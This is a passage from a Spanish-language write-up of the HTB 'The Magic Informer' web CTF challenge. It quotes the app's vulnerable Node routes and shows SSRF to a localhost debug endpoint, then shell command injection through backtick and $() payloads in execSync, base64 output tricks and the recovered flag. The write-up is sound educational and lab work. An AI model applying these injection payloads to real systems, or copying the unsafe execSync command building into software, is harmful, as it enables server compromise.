<span class="mtk1">        </span><span class="mtk7 mtki">"express"</span><span class="mtk1">: </span><span class="mtk11">"4.18.2"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"express-fileupload"</span><span class="mtk1">: </span><span class="mtk11">"1.4.0"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"jsonwebtoken"</span><span class="mtk1">: </span><span class="mtk11">"8.5.1"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"nunjucks"</span><span class="mtk1">: </span><span class="mtk11">"3.2.3"</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"sqlite-async"</span><span class="mtk1">: </span><span class="mtk11">"1.1.5"</span>
<span class="mtk1">    },</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"devDependencies"</span><span class="mtk1">: {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">"nodemon"</span><span class="mtk1">: </span><span class="mtk11">"^1.19.1"</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>De hecho, <code>axios</code> se usa en <code>/api/sms/test</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/sms/test'</span><span class="mtk1">, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">verb</span><span class="mtk1">, </span><span class="mtk1">url</span><span class="mtk1">, </span><span class="mtk1">params</span><span class="mtk1">, </span><span class="mtk1">headers</span><span class="mtk1">, </span><span class="mtk1">resp_ok</span><span class="mtk1">, </span><span class="mtk1">resp_bad</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">verb</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">params</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">headers</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">resp_ok</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">resp_bad</span><span class="mtk1">)) {</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'missing required parameters'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">parsedHeaders</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {};</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">headersArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">headers</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1">(</span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">header</span><span class="mtk1"> </span><span class="mtk5">of</span><span class="mtk1"> </span><span class="mtk1">headersArray</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">hkey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">trim</span><span class="mtk1">()</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">hval</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">trim</span><span class="mtk1">()</span>
<span class="mtk1">                </span><span class="mtk1">parsedHeaders</span><span class="mtk1">[</span><span class="mtk1">hkey</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">hval</span><span class="mtk1">;</span>
<span class="mtk1">            }</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) { </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">options</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk1">method</span><span class="mtk1">: </span><span class="mtk1">verb</span><span class="mtk1">.</span><span class="mtk8">toLowerCase</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">url</span><span class="mtk1">: </span><span class="mtk1">url</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk1">timeout</span><span class="mtk1">: </span><span class="mtk6">5000</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk1">headers</span><span class="mtk1">: </span><span class="mtk1">parsedHeaders</span>
<span class="mtk1">    };</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">verb</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'POST'</span><span class="mtk1">) </span><span class="mtk1">options</span><span class="mtk1">.data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">params</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk8">axios</span><span class="mtk1">(</span><span class="mtk1">options</span><span class="mtk1">)</span>
<span class="mtk1">        .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">response</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk9 mtki">response</span><span class="mtk1">.data) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'object'</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk9 mtki">response</span><span class="mtk1">.data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">response</span><span class="mtk1">.data);</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'success'</span><span class="mtk1">, </span><span class="mtk1">result</span><span class="mtk1">: </span><span class="mtk9 mtki">response</span><span class="mtk1">.data})</span>
<span class="mtk1">        })</span>
<span class="mtk1">        .</span><span class="mtk8">catch</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">e</span><span class="mtk1">.response) {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">typeof</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'object'</span><span class="mtk1">) {</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data);</span>
<span class="mtk1">                }</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'fail'</span><span class="mtk1">, </span><span class="mtk1">result</span><span class="mtk1">: </span><span class="mtk9 mtki">e</span><span class="mtk1">.response.data})</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'fail'</span><span class="mtk1">, </span><span class="mtk1">result</span><span class="mtk1">: </span><span class="mtk4">'Address is unreachable'</span><span class="mtk1">});</span>
<span class="mtk1">            }</span>
<span class="mtk1">        })</span>
<span class="mtk1">});</span>
</code></pre></div><p>Nuevamente, podemos echar un vistazo al sitio web en <code>/sms-settings</code>:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-17.png" alt="The Magic Informer 17"></p><h3 id="ataque-de-ssrf">Ataque de SSRF</h3><p>Aqu铆 podemos decirle a <code>axios</code> que realice la solicitud a <code>http://127.0.0.1:1337/debug/sql/exec</code>, agregando el <em>token</em> JWT para <code>admin</code>, de modo que pase <code>LocalMiddleware</code> y <code>AdminMiddleware</code>. Este es un ataque de <em>Server-Side Request Forgery</em> (SSRF):</p><p><img src="/images/HTB-Challenges/HTB-Web-The-Magic-Informer-18.png" alt="The Magic Informer 18"></p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-19.png" alt="The Magic Informer 19"></p><p>Hay un campo <code>password</code> que debe ser el valor de <code>DEBUG_PASS</code> en <code>/app/debug.env</code>. Se verifica en el controlador de <code>/debug/sql/exec</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/debug/sql/exec'</span><span class="mtk1">, LocalMiddleware, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>  

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">sql</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">sql</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.DEBUG_PASS) {</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">safeSql</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk1">sql</span><span class="mtk1">).</span><span class="mtk8">replaceAll</span><span class="mtk1">(</span><span class="mtk4">/"/</span><span class="mtk5">ig</span><span class="mtk1">, </span><span class="mtk4">"'"</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">cmdStr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`sqlite3 -csv admin.db "</span><span class="mtk5">${</span><span class="mtk1">safeSql</span><span class="mtk5">}</span><span class="mtk4">"`</span><span class="mtk1">;</span>

<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">cmdExec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">execSync</span><span class="mtk1">(</span><span class="mtk1">cmdStr</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">sql</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1">: </span><span class="mtk1">cmdExec</span><span class="mtk1">.</span><span class="mtk8">toString</span><span class="mtk1">()});</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">.</span><span class="mtk8">toString</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">.stderr) </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">.stderr.</span><span class="mtk8">toString</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">({</span><span class="mtk1">sql</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1">});</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Invalid debug password supplied!'</span><span class="mtk1">));</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">clearCookie</span><span class="mtk1">(</span><span class="mtk4">'session'</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>
<span class="mtk1">});</span>
</code></pre></div><h3 id="inyecci贸n-de-comandos">Inyecci贸n de comandos</h3><p>Obs茅rvese que el campo <code>sql</code> se usa para crear un comando que se ejecutar谩 con <code>execSync</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">safeSql</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk1">sql</span><span class="mtk1">).</span><span class="mtk8">replaceAll</span><span class="mtk1">(</span><span class="mtk4">/"/</span><span class="mtk5">ig</span><span class="mtk1">, </span><span class="mtk4">"'"</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">cmdStr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`sqlite3 -csv admin.db "</span><span class="mtk5">${</span><span class="mtk1">safeSql</span><span class="mtk5">}</span><span class="mtk4">"`</span><span class="mtk1">;</span>  

<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">cmdExec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">execSync</span><span class="mtk1">(</span><span class="mtk1">cmdStr</span><span class="mtk1">);</span>
</code></pre></div><p>Existe un filtrado m铆nimo: todas las comillas dobles ser谩n reemplazadas por comillas simples. Esto nos impide poner una comilla doble y agregar otro comando. Algo como esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span>
Welcome to Node.js v19.2.0.
Type ".help" for more information.
&gt; let sql = 'select * from users;"; whoami #'
<span class="code-grey">undefined</span>
&gt; let cmdStr = `sqlite3 -csv admin.db "${sql}"`  
<span class="code-grey">undefined</span>
&gt; const { execSync } = require('child_process')
<span class="code-grey">undefined</span>
&gt; execSync(cmdStr).toString()
Error: in prepare, file is not a database (26)
<span class="code-dark-green">'rocky\n'</span>
</code></pre></div><p>Sin embargo, no podemos usar comillas dobles. Debemos encontrar otra forma de inyectar comandos. Dado que el campo <code>safeSql</code> est谩 envuelto de comillas dobles, podemos usar la interpolaci贸n variables en Bash y, por lo tanto, ejecutar comandos usando <code>`comando`</code> o <code>$(comando)</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>&gt; sql = 'select * from users; `whoami`'
<span class="code-dark-green">'select * from users; `whoami`'</span>
</span>&gt; let safeSql = String(sql).replaceAll(/"/ig, "'");  
<span class="code-grey">undefined</span>
&gt; cmdStr = `echo "${safeSql}"`
<span class="code-dark-green">'echo "select * from users; `whoami`"'</span>
&gt; execSync(cmdStr).toString()
<span class="code-dark-green">'select * from users; rocky\n'</span>
&gt;
&gt; sql = 'select * from users; $(whoami)'
<span class="code-dark-green">'select * from users; $(whoami)'</span>
&gt; safeSql = String(sql).replaceAll(/"/ig, "'");
<span class="code-dark-green">'select * from users; $(whoami)'</span>
&gt; cmdStr = `echo "${safeSql}"`
<span class="code-dark-green">'echo "select * from users; $(whoami)"'</span>
&gt; execSync(cmdStr).toString()
<span class="code-dark-green">'select * from users; rocky\n'</span>
</code></pre></div><p>Entonces, hag谩moslo en el sitio web:</p><p><img src="/images/HTB-Challenges/HTB-Web-The-Magic-Informer-20.png" alt="The Magic Informer 20"></p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-21.png" alt="The Magic Informer 21"></p><p>Vemos un mensaje de error, pero n贸tese que <code>node</code> es el nombre del usuario a nivel de sistema. Aqu铆, si intentamos hacer <code>ls -l</code>, solo veremos una sola palabra <code>total</code>. Esto significa que el mensaje de error est谩 tomando una sola palabra, por lo que debemos usar un truco para ver la salida completa como una sola palabra. Por ejemplo, podemos pasar la salida a <code>base64 -w0</code>, de modo que la salida est茅 codificada por Base64 e impresa como una sola cadena sin espacios o saltos de l铆nea:</p><p><img src="/images/HTB-Challenges/HTB-Web-The-Magic-Informer-22.png" alt="The Magic Informer 22"></p><p><img src="/images/HTB-Challenges/HTB-Web-The-Magic-Informer-23.png" alt="The Magic Informer 23"></p><p>Ahora podemos tomar la salida y decodificarla:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> dG90YWwgODQKZHJ3eHIteHIteCAgICAxIG5vZGUgICAgIG5vZGUgICAgICAgICAgNDA5NiBEZWMgMTkgMTU6MDkgYXBwCmRyd3hyLXhyLXggICAgMSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgSnVuICA2ICAyMDIyIGJpbgpkcnd4ci14ci14ICAgIDUgcm9vdCAgICAgcm9vdCAgICAgICAgICAgMzYwIERlYyAxOSAxNTowOCBkZXYKZHJ3eHIteHIteCAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgNDA5NiBEZWMgMTkgMTU6MDggZXRjCmRyd3hyLXhyLXggICAgMSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgSnVuICA2ICAyMDIyIGhvbWUKZHJ3eHIteHIteCAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgNDA5NiBKdW4gIDYgIDIwMjIgbGliCmRyd3hyLXhyLXggICAgNSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgQXByICA0ICAyMDIyIG1lZGlhCmRyd3hyLXhyLXggICAgMiByb290ICAgICByb290ICAgICAgICAgIDQwOTYgQXByICA0ICAyMDIyIG1udApkcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICA0MDk2IEp1biAgNiAgMjAyMiBvcHQKZHIteHIteHIteCAgNDU1IHJvb3QgICAgIHJvb3QgICAgICAgICAgICAgMCBEZWMgMTkgMTU6MDggcHJvYwotcndzci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgIDE4Nzg0IERlYyAgNiAxMjo1OSByZWFkZmxhZwpkcnd4LS0tLS0tICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICA0MDk2IERlYyAgNiAxMjo1OSByb290CmRyd3hyLXhyLXggICAgMSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgRGVjIDE5IDE1OjA4IHJ1bgpkcnd4ci14ci14ICAgIDIgcm9vdCAgICAgcm9vdCAgICAgICAgICA0MDk2IEFwciAgNCAgMjAyMiBzYmluCmRyd3hyLXhyLXggICAgMiByb290ICAgICByb290ICAgICAgICAgIDQwOTYgQXByICA0ICAyMDIyIHNydgpkci14ci14ci14ICAgMTMgcm9vdCAgICAgcm9vdCAgICAgICAgICAgICAwIERlYyAxOSAxNTowOCBzeXMKZHJ3eHJ3eHJ3dCAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgNDA5NiBEZWMgMTkgMTU6MDggdG1wCmRyd3hyLXhyLXggICAgMSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgTm92IDMwIDE2OjQyIHVzcgpkcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICA0MDk2IEFwciAgNCAgMjAyMiB2YXIK | <span class="code-dark-green">base64</span> -d  
total 84
drwxr-xr-x    1 node     node          4096 Dec 19 15:09 app
drwxr-xr-x    1 root     root          4096 Jun  6  2022 bin
drwxr-xr-x    5 root     root           360 Dec 19 15:08 dev
drwxr-xr-x    1 root     root          4096 Dec 19 15:08 etc
drwxr-xr-x    1 root     root          4096 Jun  6  2022 home
drwxr-xr-x    1 root     root          4096 Jun  6  2022 lib
drwxr-xr-x    5 root     root          4096 Apr  4  2022 media
drwxr-xr-x    2 root     root          4096 Apr  4  2022 mnt
drwxr-xr-x    1 root     root          4096 Jun  6  2022 opt
dr-xr-xr-x  455 root     root             0 Dec 19 15:08 proc
-rwsr-xr-x    1 root     root         18784 Dec  6 12:59 readflag
drwx------    1 root     root          4096 Dec  6 12:59 root
drwxr-xr-x    1 root     root          4096 Dec 19 15:08 run
drwxr-xr-x    2 root     root          4096 Apr  4  2022 sbin
drwxr-xr-x    2 root     root          4096 Apr  4  2022 srv
dr-xr-xr-x   13 root     root             0 Dec 19 15:08 sys
drwxrwxrwt    1 root     root          4096 Dec 19 15:08 tmp
drwxr-xr-x    1 root     root          4096 Nov 30 16:42 usr
drwxr-xr-x    1 root     root          4096 Apr  4  2022 var
</code></pre></div><p>Lo anterior es el resultado de <code>ls -l /</code>. Aqu铆 vemos un archivo ejecutable llamado <code>readflag</code>, as铆 que vamos a ejecutarlo y a obtener la salida en Base64:</p><p><img src="/images/HTB-Challenges/HTB-Web-The-Magic-Informer-24.png" alt="The Magic Informer 24"></p><p><img src="/images/HTB-Challenges/HTB-Web-The-Magic-Informer-25.png" alt="The Magic Informer 25"></p><h2 id="_flag_"><em>Flag</em></h2><p>Esta vez, los datos no se decodifican bien por alguna raz贸n. En este punto, podemos ir a <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=U0ZSQ2UySnlNR3N6Ymw4MGRUZG9YelUxY21aZk5ITmZORjgxTTNKMk1XTXpYek40TTJOZlpuUjNmUQ">CyberChef</a> y decodificarlo ah铆:</p><p><img src="/images/HTB-Challenges/HTB-Web-The-Magic-Informer-26.png" alt="The Magic Informer 26"></p><p>El problema era que a la cadena codificada le faltan unos signos <code>=</code> de relleno al final:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> SFRCe2JyMGszbl80dTdoXzU1cmZfNHNfNF81M3J2MWMzXzN4M2NfZnR3fQ== | <span class="code-dark-green">base64</span> -d  
HTB{br0k3n_4u7h_55rf_4s_4_53rv1c3_3x3c_ftw}
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#registrando-una-nueva-cuenta">Registrando una nueva cuenta</a></li><li><a href="#navegaci贸n-de-directorios-y-lectura-de-archivos-locales">Navegaci贸n de directorios y lectura de archivos locales</a></li><li><a href="#an谩lisis-de-c贸digo-est谩tico">An谩lisis de c贸digo est谩tico</a><ul><li><a href="#implementaci贸n-de-la-base-de-datos">Implementaci贸n de la base de datos</a></li><li><a href="#rutas-disponibles">Rutas disponibles</a></li></ul></li><li><a href="#efectuando-el-ataque">Efectuando el ataque</a><ul><li><a href="#convirti茅ndonos-en-admin">Convirti茅ndonos en <code>admin</code></a></li><li><a href="#m谩s-an谩lisis-de-c贸digo-fuente">M谩s an谩lisis de c贸digo fuente</a></li><li><a href="#ataque-de-ssrf">Ataque de SSRF</a></li><li><a href="#inyecci贸n-de-comandos">Inyecci贸n de comandos</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electr贸nico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 